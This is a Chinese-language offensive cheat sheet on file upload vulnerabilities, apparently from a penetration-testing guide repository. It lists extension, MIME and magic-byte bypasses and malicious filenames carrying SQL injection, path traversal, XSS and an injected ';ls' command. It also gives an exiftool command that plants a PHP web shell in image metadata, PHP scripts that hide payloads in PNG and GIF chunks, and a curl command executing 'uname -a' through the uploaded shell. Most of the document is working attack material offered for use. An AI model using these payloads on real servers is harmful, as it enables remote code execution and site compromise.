# 任意文件上传漏洞

## 文件扩展名

### 常见扩展

php
```bash
.php
.php2
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
.shtml
.htaccess
.hphp
.ctp
.module
```

asp
```bash
.asp
.aspx
.config
.cer and .asa # (IIS <= 7.5)
.aspx;1.jpg # (IIS < 7.0)
.soap
.ashx
.asmx
.aspq
.axd
.cshtm
.cshtml
.rem
.vbhtm
.vbhtml
.shtml
```

jsp
```bash
.jsp
.jspx
.jsw
.jsv
.jspf
.wss
.do
.actions
```

perl
```bash
.pl
.pm
.cgi
.lib
```

Coldfusion
```bash
.cfm
.cfml
.cfc
.dbm
```

Node.js
```bash
.js
.json
.node
```

Flash
```bash
.swf
```

### 绕过文件扩展名检查

1.双扩展
```
.jpg.php
.png.ph5
```

2.反向双扩展
```
.php.jpg
.php.png
```

3.随机大小写
```
.PHp
.pHp5
.phAR
```

4.空字节
```
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

5.特殊字符
```
file.php%20
file.php%0d%0a.jpg
file.php%0a
name.%E2%80%AEphp.jpg
file.php/
file.php.\
file.j\sp
file.j/sp
file.jsp/././././.
file.

Only Windows:
file.php......
file.php....
file.pHp5....
```

6.Mime类型
```
Content-Type : image/gif
Content-Type : image/gif
Content-Type : image/png
Content-Type : image/jpeg
```

内容类型单词列表

[Content-Type](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/content-type.txt)

7.魔术字节

PNG
```
"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["
```

JPG
```
"\xff\xd8\xff"
```

GIF
```
GIF87a
GIF8;
```

在 Windows 中使用 NTFS 备用数据流 (ADS)。在这种情况下，将在禁止的扩展名之后和允许的扩展名之前插入:。因此，将在服务器上创建一个带有禁止扩展名的空文件（例如"file.asax:.jpg"）。稍后可能会使用其他技术（例如使用其短文件名）编辑此文件。 "::$data"模式也可用于创建非空文件。因此，在此模式后添加一个点字符也可能有助于绕过进一步的限制（例如"file.asp::$data"）。

更多文件签名列表

[WikiPedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

## 文件名

```
filename.php' AND (SELECT SLEEP(5)) AND '1'='1。
filename.php../../../../../../../../../etc/passwd。
filename.php<script>alert(1)</script>。
filename.php;ls。
filename.php../../../tmp/
"><img src onerror=prompt(1)>.jpg
```

## 图片元数据

```bash
exiftool -Comment="<?php echo 'Command:'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();" test.jpg
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="GhostWolfLab" -Artist="Snowwolf" -ImageUniqueID="Example" payload.jpg
```

## PLTE

```bash
apt-get install php-gd
```

1.第一种

createPLTE.php
```php
<?php
$_payload="<?php phpinfo()?> ";
$_pay_len=strlen($_payload);
if(strlen($_payload)%3!=0){
 echo "payload%3==0 !"; exit();
}

$width=$_pay_len/3;
$height=20;
$im = imagecreate($width, $height);

$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);

for($i=0; $i < count($_chunks); $i++){

  $_color_chunks=str_split($_chunks[$i], 2);
$color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
  imagesetpixel($im,$i,1,$color);
}

imagepng($im,"test.png");
```

```bash
php createPLTE.php
```

2.第二种

generate_plte_png.php
```php
<?php

if(count($argv) != 3) exit("Usage $argv[0] <PHP payload> <Output file>");

$_payload = $argv[1];
$output = $argv[2];

while (strlen($_payload) % 3 != 0) { $_payload.=" "; }

$_pay_len=strlen($_payload);
if ($_pay_len > 256*3){
    echo "FATAL: The payload is too long. Exiting...";
    exit();
}
if($_pay_len %3 != 0){
    echo "FATAL: The payload isn't divisible by 3. Exiting...";
    exit();
}

$width=$_pay_len/3;
$height=20;
$im = imagecreate($width, $height);

$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);

for($i=0; $i < count($_chunks); $i++){
    $_color_chunks=str_split($_chunks[$i], 2);
    $color=imagecolorallocate($im, hexdec($_color_chunks[0]), hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
    imagesetpixel($im,$i,1,$color);
}

imagepng($im,$output);
```

```bash
php generate_plte_png.php '<?php phpinfo(); ?>' test.php
```

## 全局颜色表

createGIF.php
```php
<?php
$_file="example.gif";
$_payload="<?php phpinfo();?>";
$_width=200;
$_height=200;
if(strlen($_payload)%3!=0){
 echo "payload%3==0 !"; exit();
}
$im = imagecreate($_width, $_height);
$_hex=unpack('H*',$_payload);

$colors_hex=str_split($_hex[1], 6);

for($i=0; $i < count($colors_hex); $i++){
  $_color_chunks=str_split($colors_hex[$i], 2);
$color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
  imagesetpixel($im,$i,1,$color);
}

imagegif($im,$_file);
?>
```

```bash
php createGIF.php
```

## IDAT

generate_idat_png.php
```php
<?php

header('Content-Type: image/png');

$p = array(0xA3, 0x9F, 0x67, 0xF7, 0x0E, 0x93, 0x1B, 0x23, 0xBE, 0x2C, 0x8A, 0xD0, 0x80, 0xF9, 0xE1, 0xAE, 0x22, 0xF6, 0xD9, 0x43, 0x5D, 0xFB, 0xAE, 0xCC, 0x5A, 0x01, 0xDC, 0xAA, 0x52, 0xD0, 0xB6, 0xEE, 0xBB, 0x3A, 0xCF, 0x93, 0xCE, 0xD2, 0x88, 0xFC, 0x69, 0xD0, 0x2B, 0xB9, 0xB0, 0xFB, 0xBB, 0x79, 0xFC, 0xED, 0x22, 0x38, 0x49, 0xD3, 0x51, 0xB7, 0x3F, 0x02, 0xC2, 0x20, 0xD8, 0xD9, 0x3C, 0x67, 0xF4, 0x50, 0x67, 0xF4, 0x50, 0xA3, 0x9F, 0x67, 0xA5, 0xBE, 0x5F, 0x76, 0x74, 0x5A, 0x4C, 0xA1, 0x3F, 0x7A, 0xBF, 0x30, 0x6B, 0x88, 0x2D, 0x60, 0x65, 0x7D, 0x52, 0x9D, 0xAD, 0x88, 0xA1, 0x66, 0x94, 0xA1, 0x27, 0x56, 0xEC, 0xFE, 0xAF, 0x57, 0x57, 0xEB, 0x2E, 0x20, 0xA3, 0xAE, 0x58, 0x80, 0xA7, 0x0C, 0x10, 0x55, 0xCF, 0x09, 0x5C, 0x10, 0x40, 0x8A, 0xB9, 0x39, 0xB3, 0xC8, 0xCD, 0x64, 0x45, 0x3C, 0x49, 0x3E, 0xAD, 0x3F, 0x33, 0x56, 0x1F, 0x19 );

$img = imagecreatetruecolor(110, 110);

for ($y = 0; $y < sizeof($p); $y += 3) {
$r = $p[$y];
$g = $p[$y+1];
$b = $p[$y+2];
$color = imagecolorallocate($img, $r, $g, $b);
imagesetpixel($img, round($y / 3)*2, 0, $color);
imagesetpixel($img, round($y / 3)*2+1, 0, $color);
imagesetpixel($img, round($y / 3)*2, 1, $color);
imagesetpixel($img, round($y / 3)*2+1, 1, $color);
}

imagepng($img);
?>
```

```bash
php generate_idat_png.php > test.php
curl -X POST -d '1=uname -a' 'http://www.example.com/test.php?0=shell_exec'
```

## TEXT

generate_tEXt_png.php
```php
<?php

if(count($argv) != 4) exit("Usage $argv[0] <Input file> <PHP payload> <Output file>");

$input = $argv[1];
$_payload = $argv[2];
$output = $argv[3];

$imgck = new Imagick($input);
$imgck->setImageProperty("Synacktiv", $_payload);
$imgck->writeImage($output);

?>
```

```bash
php generate_tEXt_png.php 'test.png' '<?php phpinfo(); ?>' 'test.php'
```
